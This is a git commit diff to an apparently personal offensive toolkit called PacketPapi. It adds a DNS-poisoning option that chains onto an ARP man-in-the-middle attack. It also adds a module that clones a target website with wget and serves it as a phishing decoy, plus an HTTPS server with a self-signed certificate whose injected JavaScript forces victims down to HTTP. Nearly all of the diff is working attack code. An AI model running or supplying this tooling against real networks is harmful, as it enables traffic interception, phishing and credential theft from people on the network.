267e77abecb587b0fffa6da7d872511eae9bc0c3
professor-oats <chronophob@gmail.com>
2024-11-13 05:02:17 +0100

    soon prod ready decoy_site, need more tinkering

--- Project1/PacketPapi/packetpapi.py
+++ Project1/PacketPapi/packetpapi.py
@@ -3,10 +3,15 @@ from . import arppoison_monitor
 from . import gendict_knowndevices
 from . import mitm_arp
 from . import packetsniffer
+from . import DNSpoisoner
+from . import spawn_decoy_site
 from scapy.layers.l2 import getmacbyip, get_if_hwaddr
 from scapy.all import conf, get_if_list
 import multiprocessing
 import ipaddress
+import time
+
+## Initialize a logger for PacketPapi's processes perhaps??
 
 BANNER = """
 \033[34m#######################################
@@ -17,6 +22,8 @@ BANNER = """
 CATEGORIES = """
 \033[1m\033[95mOFFENSIVE SCRIPTS\033[0m
 [\033[97mC\033[0m]ustom MitM ARP - Construct a MitM between two network devices
+[\033[97mD\033[0m]NSpoisoner - Begin DNS poisoning on target, use after MitM ARP for better prio
+[\033[97mS\033[0m]pawn http decoy site - Use after you have DNS poisoned, clone a website and local host for fish
 [\033[97mP\033[0m]acketSniffer - Use on the interface where the MitM is positioned
 
 
@@ -43,12 +50,21 @@ def is_valid_interface(in_interface):
   print("Please pick an interface running your MitM")
   return False
 
+def terminate_running_process(in_process):
+  print(f"Terminating Daemon {in_process.name}...")
+  print(f"Stopping the {in_process.name} process...")
+  in_process.terminate()
+  in_process.join()
+  return
+
 def main():
   print(BANNER)
 
   victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac = (None,) * 5
   mitm_arp_process = None
   sniffing_process = None
+  dns_poison_process = None
+  decoy_server_process = None
 
   try:  ## Need this to terminate Daemons upon keyboard interrupting packetpapi
         ## Neat with this is that we can return to oatstools also on keyboard interrupt
@@ -87,14 +103,52 @@ def main():
 
         mitm_arp_process = multiprocessing.Process(
           target=mitm_arp.main,
+          name="mitm_arp_process",
           args=(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)
           #daemon=True  # This will automatically terminate when main script exits
         )
         mitm_arp_process.start()
 
+      elif userchoice.strip().lower() == "d":
+        if not mitm_arp_process or not mitm_arp_process.is_alive():
+          print("Non running mitm_arp process found. Do you wish to continue? (Y)"
+                "Or wish to go back and start a mitm? (N)")
+          start_dns_poison = input("")
+          if not start_dns_poison.strip().lower() == "y":
+            print("Going back...")
+            continue
+
+        victim_ip = input("Declare the IP of the victim you want to target:\n")
+        spoof_domain = input("Enter the target domain you like to redirect from:\n")
+        spoof_ip = input("Enter the IP address you like to redirect to:\n")
+
+        dns_poison_process = multiprocessing.Process(target=DNSpoisoner.main, name="dns_poison_process", args=(victim_ip, spoof_domain, spoof_ip))
+        dns_poison_process.start()
+
+      elif userchoice.strip().lower() == "s":
+        if not mitm_arp_process or not mitm_arp_process.is_alive():
+          print("Non running mitm_arp process found. Go back and start a mitm...")
+          time.sleep(2)
+          continue
+
+        if not dns_poison_process or not dns_poison_process.is_alive():
+          print("No DNS poison detected. Go back and start DNS poisoning...")
+          time.sleep(2)
+          continue
+
+        if decoy_server_process and decoy_server_process.is_alive():
+          print("Stopping previous decoy server...")
+          decoy_server_process.terminate()
+          decoy_server_process.join()
+
+        decoy_url = input("Input the URL you want to clone as a decoy:\n")
+        port = 80
+        decoy_server_process = multiprocessing.Process(target=spawn_decoy_site.main, name="decoy_server_process", args=(decoy_url, port,))
+        decoy_server_process.start()
+
       elif userchoice.strip().lower() == "p":
         if sniffing_process and sniffing_process.is_alive():
-          print("Stopping precious sniffing process...")
+          print("Stopping previous sniffing process...")
           sniffing_process.terminate()
           sniffing_process.join()
 
@@ -104,7 +158,7 @@ def main():
             break
           sniffing_interface=input("")
 
-        sniffing_process = multiprocessing.Process(target=packetsniffer.start_sniffing, args=(sniffing_interface,))
+        sniffing_process = multiprocessing.Process(target=packetsniffer.start_sniffing, name="sniffing_process", args=(sniffing_interface,))
         sniffing_process.start()
 
 
@@ -122,36 +176,44 @@ def main():
 
       ## Correctly terminating spawned subprocesses on [back] option and returning to Oatstools
       elif userchoice.strip().lower() == "b":
-        print("Terminating Daemon mitm_arp_process...")
         if mitm_arp_process and mitm_arp_process.is_alive():
-          print("Stopping ARP spoofing and restoring ARP tables...")
-          mitm_arp_process.terminate()
-          mitm_arp_process.join()
+          terminate_running_process(mitm_arp_process)
           mitm_arp.restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
           mitm_arp.restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)  # Original victim_mac_here
 
-        print("Terminating Daemon sniffing_process...")
+        if dns_poison_process and dns_poison_process.is_alive():
+          terminate_running_process(dns_poison_process)
+
+        if decoy_server_process and decoy_server_process.is_alive():
+          # Graceful termination of servers
+          if spawn_decoy_site.https_server:
+            spawn_decoy_site.https_server.shutdown()  # Stop the HTTPS server
+            spawn_decoy_site.https_server.server_close()  # Close the HTTPS server's socket
+          if spawn_decoy_site.http_server:
+            spawn_decoy_site.http_server.shutdown()  # Stop the HTTPS server
+            spawn_decoy_site.http_server.server_close()  # Close the HTTPS server's socket
+          terminate_running_process(decoy_server_process)
+
         if sniffing_process and sniffing_process.is_alive():
-          print("Stopping the sniffing process...")
-          sniffing_process.terminate()
-          sniffing_process.join()
+          terminate_running_process(sniffing_process)
+
         return
 
   ## Correctuly terminating spawned subprocesses on KeyboardInterrupt and returning to Oatstools
   except KeyboardInterrupt:
-    print("Terminating Daemon mitm_arp_process...")
     if mitm_arp_process and mitm_arp_process.is_alive():
-      print("Stopping ARP spoofing and restoring ARP tables...")
-      mitm_arp_process.terminate()
-      mitm_arp_process.join()
+      terminate_running_process(mitm_arp_process)
       mitm_arp.restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
       mitm_arp.restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)  # Original victim_mac_here
 
-    print("Terminating Daemon sniffing_process...")
+    if dns_poison_process and dns_poison_process.is_alive():
+      terminate_running_process(dns_poison_process)
+
+    if decoy_server_process and decoy_server_process.is_alive():
+      terminate_running_process(decoy_server_process)
+
     if sniffing_process and sniffing_process.is_alive():
-      print("Stopping the sniffing process...")
-      sniffing_process.terminate()
-      sniffing_process.join()
+      terminate_running_process(sniffing_process)
 
     print("All subprocesses are terminated. Exiting \033[95mpacketpapi\033[0m.")
     return
---
+++ Project1/PacketPapi/spawn_decoy_site.py
@@ -0,0 +1,155 @@
+import subprocess
+import os
+import requests
+from urllib.robotparser import RobotFileParser
+from urllib.parse import urlparse
+from http.server import SimpleHTTPRequestHandler
+from . import gen_selfsigned_cert
+import http.server
+import ssl
+import socketserver
+import signal
+import time
+import threading
+
+# Can also try to use a browser redirect, will test what works best:
+# def do_GET(self):
+#     # Send HTTP Redirect Response (301 or 302)
+#     self.send_response(301)  # Use 302 for temporary redirects
+#     self.send_header("Location", "http://{domain}".format(domain=domain))
+#     self.end_headers()
+
+
+# Define the handler with JavaScript injection
+class InjectRedirectHandler(SimpleHTTPRequestHandler):
+  def do_GET(self):
+    # Inject JavaScript to redirect from HTTPS to HTTP
+    content = """
+        <html>
+        <head>
+          <script type="text/javascript">
+            if (window.location.protocol === "https:") {
+              window.location.protocol = "http:";
+            }
+          </script>
+        </head>
+        <body>
+          <h1>Redirecting...</h1>
+          <p>If not redirected, please try <a href="http://{domain}">this link</a>.</p>
+        </body>
+        </html>
+        """.format(domain=domain)  # JS inject on the local domain that we host, using global domain variable
+
+    # Respond with the injected HTML content
+    self.send_response(200)
+    self.send_header("Content-type", "text/html")
+    self.end_headers()
+    self.wfile.write(content.encode("utf-8"))
+
+## Define globals to be used
+domain = ''
+directory_name = ''
+https_server = None
+http_server = None
+
+
+def cert_and_key_file_exist(cert_file="cert.pem", key_file="key.pem"):
+  return os.path.exists(cert_file) and os.path.exists(key_file)
+
+# Function to check robots.txt for scraping permission
+# If I want to honor robots.txt I have to fix so it can be found from mainsite and if not
+# handle that as well. Currently we are running into errors.
+def can_scrape(in_url):
+  robots_url = in_url.rstrip('/') + "/robots.txt"  # Ensure no double slashes
+  rp = RobotFileParser()
+
+  try:
+    rp.set_url(robots_url)
+    rp.read()  # Read the robots.txt file
+    return rp.can_fetch('*', in_url)
+  except (requests.exceptions.RequestException, ValueError) as e:
+    # If robots.txt is missing or there is any error, assume scraping is allowed
+    print(f"Error fetching {robots_url}: {e}")
+    return True  # Default to allowing scraping if robots.txt is inaccessible or missing
+
+
+# Main scraping function
+def scrape_page(in_url):
+  # First, check if scraping is allowed
+ # if not can_scrape(in_url):
+  #  print(f"Scraping is not allowed by robots.txt on {in_url}")
+   # set_override=input("Override? (Y/N)")
+   # if not set_override.strip().lower() == 'y':
+   #   return
+
+  # Parse the URL and extract the netloc (domain)
+  global domain
+  global directory_name
+
+  parsed_url = urlparse(in_url)
+  domain = parsed_url.netloc
+
+  directory_name = domain + 'Site'
+
+  if not os.path.exists(directory_name):
+    os.makedirs(directory_name)
+
+  scrape_result = subprocess.run(['wget', '--user-agent', 'Mozilla/5.0', '--recursive',
+                  '--limit-rate=50k', '--no-parent', '-l1', '--wait=2', '--random-wait',
+                    in_url, '-P', directory_name])
+
+  # Return on scrape error
+  if scrape_result.returncode != 0:
+    print(f"Error while scraping {in_url}")
+    return
+
+
+def host_local_decoy_https_server(in_cert_file, in_key_file):
+  global https_server
+  server_address = ('', 443)
+  https_server = http.server.HTTPServer(server_address, InjectRedirectHandler)
+
+  # Wrap server with SSL (self-signed certificate)
+  https_server.socket = ssl.wrap_socket(https_server.socket,
+                                        in_cert_file,
+                                        in_key_file,
+                                        server_side=True)
+
+  print("HTTPS server with JavaScript redirect running on port 443...")
+  https_server.serve_forever()
+
+
+def host_local_decoy_http_server(port=80):
+  global http_server
+  dotindex_path = os.path.join(directory_name, f'www.{domain}')
+  os.chdir(dotindex_path)  # Change directory to the downloaded site
+  http_server = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)
+
+  print(f"Serving {dotindex_path} at http://localhost:{port}")
+  http_server.serve_forever()
+
+
+# Example usage
+def main(in_url, in_port):
+  # Oh boy ...
+  scrape_page(in_url)
+  signal.signal(signal.SIGINT, signal.SIG_IGN)
+  port = in_port
+
+  cert_pem, key_pem = gen_selfsigned_cert.create_self_signed_cert(domain)
+  while not cert_and_key_file_exist("cert.pem", "key.pem"):  ## Easy inwait of cert and key generate
+    time.sleep(2)
+
+  # Start the HTTPS server thread
+  https_thread = threading.Thread(target=host_local_decoy_https_server, args=(cert_pem, key_pem))
+  https_thread.daemon = True
+  https_thread.start()
+
+  # Start the HTTP server thread
+  http_thread = threading.Thread(target=host_local_decoy_http_server, args=(port,))
+  http_thread.daemon = True
+  http_thread.start()
+
+
+if __name__ == '__main__':
+  main(in_url="", in_port=80)
